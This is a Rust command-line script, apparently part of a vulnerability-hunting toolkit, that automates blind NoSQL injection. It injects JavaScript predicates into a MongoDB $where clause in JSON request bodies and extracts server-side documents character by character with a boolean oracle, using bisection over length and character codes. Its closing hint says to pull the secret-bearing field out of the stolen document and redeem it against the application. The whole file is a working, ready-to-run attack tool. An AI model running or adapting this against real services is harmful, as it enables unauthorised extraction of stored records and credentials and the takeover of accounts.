#!/usr/bin/env rust-script
//! name: json_oracle
//! description: JSON-body boolean-oracle string extractor - for injection points that only accept application/json (express-style jsonSubmit logins, JSON APIs), where form-urlencoded blind_oracle cannot reach. The caller names a server-side JS expression (e.g. JSON.stringify(this) inside a Mongo $where), the piece binary-searches its length and then each character code, reading true/false off one response marker, and returns the extracted string plus the parsed JSON document when it parses.
//! version: 1.0.0
//! args: <url> --expr 'JS-EXPR' --true MARKER [--wrap 'JSON-with-{WHERE}'] [--method POST|GET] [--jar PATH] [--header 'K: V']... [--lo N] [--hi N] [--max-len N] [--threads N] [--out FILE] [--timeout-ms N] [--selftest]
//! keywords: 漏洞猎手套件, blind, oracle, json, nosql, mongo, where, boolean, extract, 逐字符提取
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```
use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{mpsc, Arc};
use std::time::{Duration, Instant};

static TRANSPORT_ERRORS: AtomicUsize = AtomicUsize::new(0);
static REQUESTS: AtomicUsize = AtomicUsize::new(0);

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Cfg {
    url: String,
    expr: String,
    marker: String,
    wrap: String,
    method: String,
    headers: Vec<(String, String)>,
    jar: Jar,
    lo: u32,
    hi: u32,
    max_len: usize,
    threads: usize,
    out: Option<String>,
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        url: String::new(),
        expr: "JSON.stringify(this)".to_string(),
        marker: String::new(),
        wrap: r#"{"user":{"$where":"{WHERE}"}}"#.to_string(),
        method: "POST".to_string(),
        headers: Vec::new(),
        jar: BTreeMap::new(),
        lo: 0,
        hi: 255,
        max_len: 2048,
        threads: 8,
        out: None,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--expr" => { i += 1; cfg.expr = arg(&args, i); }
            "--true" => { i += 1; cfg.marker = arg(&args, i); }
            "--wrap" => { i += 1; cfg.wrap = arg(&args, i); }
            "--method" => { i += 1; cfg.method = arg(&args, i).to_uppercase(); }
            "--jar" => { i += 1; cfg.jar = load_jar(&arg(&args, i)); }
            "--header" => {
                i += 1;
                let kv = arg(&args, i);
                if let Some((k, v)) = kv.split_once(':') {
                    cfg.headers.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--lo" => { i += 1; cfg.lo = arg(&args, i).parse().unwrap_or(0); }
            "--hi" => { i += 1; cfg.hi = arg(&args, i).parse().unwrap_or(255); }
            "--max-len" => { i += 1; cfg.max_len = arg(&args, i).parse().unwrap_or(2048); }
            "--threads" => { i += 1; cfg.threads = arg(&args, i).parse().unwrap_or(8).max(1); }
            "--out" => { i += 1; cfg.out = Some(arg(&args, i)); }
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.url.is_empty() || cfg.marker.is_empty() {
        pi_rust_lib::report::failure(
            "json_oracle",
            "<url> and --true MARKER are required",
            "call as: json_oracle <url> --expr 'JSON.stringify(this)' --true '<response marker for true>' [--wrap JSON-with-{WHERE}]",
        );
        std::process::exit(2);
    }
    if cfg.expr.contains('"') || cfg.expr.contains('\\') || cfg.expr.contains('\n') {
        pi_rust_lib::report::failure(
            "json_oracle",
            "--expr must not contain double quotes, backslashes or newlines (it is spliced into a JSON string)",
            "use single-quoted JS only, e.g. Object.keys(this).join('|')",
        );
        std::process::exit(2);
    }
    if !cfg.wrap.contains("{WHERE}") {
        pi_rust_lib::report::failure("json_oracle", "--wrap must contain the {WHERE} placeholder", "add {WHERE} inside the JSON body string");
        std::process::exit(2);
    }

    let started = Instant::now();
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(30)).build();
    let cfg = Arc::new(cfg);

    let len = probe_len(&agent, &cfg);
    if len == 0 {
        pi_rust_lib::report::failure(
            "json_oracle",
            "length probe returned 0: the true-marker was never seen, so the oracle or the wrap is wrong",
            "verify the marker text against a hand-made true/false pair and check --wrap",
        );
        std::process::exit(3);
    }

    let mut codes: Vec<u32> = vec![0; len];
    let positions: Vec<usize> = (0..len).collect();
    let chunk = (positions.len() + cfg.threads - 1) / cfg.threads;
    let (tx, rx) = mpsc::channel();
    for part in positions.chunks(chunk.max(1)) {
        let tx = tx.clone();
        let cfg = cfg.clone();
        let agent = agent.clone();
        let part = part.to_vec();
        std::thread::spawn(move || {
            for p in part {
                let c = bisect_code(&agent, &cfg, p);
                let _ = tx.send((p, c));
            }
        });
    }
    drop(tx);
    for (p, c) in rx {
        codes[p] = c;
    }

    let extracted: String = codes.iter().filter_map(|c| char::from_u32(*c)).collect();
    let document = serde_json::from_str::<Value>(&extracted).ok();
    let mut data = json!({
        "extracted": extracted,
        "length": len,
        "requests": REQUESTS.load(Ordering::Relaxed),
        "transport_errors": TRANSPORT_ERRORS.load(Ordering::Relaxed),
        "elapsed_ms": started.elapsed().as_millis() as u64,
        "marker": cfg.marker,
        "expr": cfg.expr,
    });
    if let Some(doc) = &document {
        data["document"] = doc.clone();
    }
    if let Some(path) = &cfg.out {
        if std::fs::write(path, &extracted).is_ok() {
            data["out"] = json!(path);
        }
    }
    let next = if document.is_some() {
        "pick the secret-bearing field out of the extracted document and redeem it against the app flow"
    } else {
        "the extraction did not parse as JSON - narrow --expr (e.g. Object.keys(this).join('|'))"
    };
    pi_rust_lib::report::success("json_oracle", data, next).expect("report");
}

/// Fire one boolean probe: substitute the predicate into the JSON wrap and read the marker.
fn probe(agent: &ureq::Agent, cfg: &Cfg, predicate: &str) -> bool {
    let body = cfg.wrap.replace("{WHERE}", predicate);
    let attempt = |retry: bool| -> Option<bool> {
        let mut req = if cfg.method == "POST" { agent.post(&cfg.url) } else { agent.get(&cfg.url) };
        req = req.set("Content-Type", "application/json");
        let cookie = cookie_header(&cfg.jar, &cfg.url);
        if !cookie.is_empty() {
            req = req.set("Cookie", &cookie);
        }
        for (k, v) in &cfg.headers {
            req = req.set(k, v);
        }
        REQUESTS.fetch_add(1, Ordering::Relaxed);
        let result = if cfg.method == "POST" { req.send_string(&body) } else { req.call() };
        match result {
            Ok(r) | Err(ureq::Error::Status(_, r)) => {
                let text = r.into_string().unwrap_or_default();
                if retry && !text.contains(&cfg.marker) && text.trim().is_empty() {
                    None
                } else {
                    Some(text.contains(&cfg.marker))
                }
            }
            Err(_) => None,
        }
    };
    match attempt(false) {
        Some(v) => v,
        None => {
            TRANSPORT_ERRORS.fetch_add(1, Ordering::Relaxed);
            attempt(true).unwrap_or(false)
        }
    }
}

fn probe_len(agent: &ureq::Agent, cfg: &Cfg) -> usize {
    let (mut lo, mut hi) = (0u32, cfg.max_len as u32);
    while lo < hi {
        let mid = (lo + hi + 1) / 2;
        let pred = format!("({}).length >= {}", cfg.expr, mid);
        if probe(agent, cfg, &pred) {
            lo = mid;
        } else {
            hi = mid - 1;
        }
    }
    lo as usize
}

fn bisect_code(agent: &ureq::Agent, cfg: &Cfg, pos: usize) -> u32 {
    let (mut lo, mut hi) = (cfg.lo, cfg.hi);
    while lo < hi {
        let mid = (lo + hi + 1) / 2;
        let pred = format!("({}).charCodeAt({}) >= {}", cfg.expr, pos, mid);
        if probe(agent, cfg, &pred) {
            lo = mid;
        } else {
            hi = mid - 1;
        }
    }
    lo
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = url::Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default();
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let wrap = r#"{"u":"a","$where":"{WHERE}"}"#;
    let body = wrap.replace("{WHERE}", &"({}).charCodeAt(3) >= 115".replace("{}", "JSON.stringify(this)"));
    let ok_wrap = body.contains(r#""$where":"(JSON.stringify(this)).charCodeAt(3) >= 115""#);
    let len_pred = format!("({}).length >= {}", "JSON.stringify(this)", 7);
    let ok_len = len_pred == "(JSON.stringify(this)).length >= 7";
    // bisect math on a known code (115 = 's')
    let target = 115u32;
    let (mut lo, mut hi) = (0u32, 255u32);
    while lo < hi {
        let mid = (lo + hi + 1) / 2;
        if target >= mid { lo = mid } else { hi = mid - 1 }
    }
    let ok_bisect = lo == 115;
    let ok = ok_wrap && ok_len && ok_bisect;
    let data = json!({"selftest": if ok {"ok"} else {"fail"}, "wrap": body, "len_pred": len_pred, "bisect": lo});
    if ok {
        pi_rust_lib::report::success("json_oracle", data, "selftest passed; ready to run").expect("report");
    } else {
        pi_rust_lib::report::failure("json_oracle", "selftest failed", "inspect substitution/bisect");
        std::process::exit(1);
    }
}
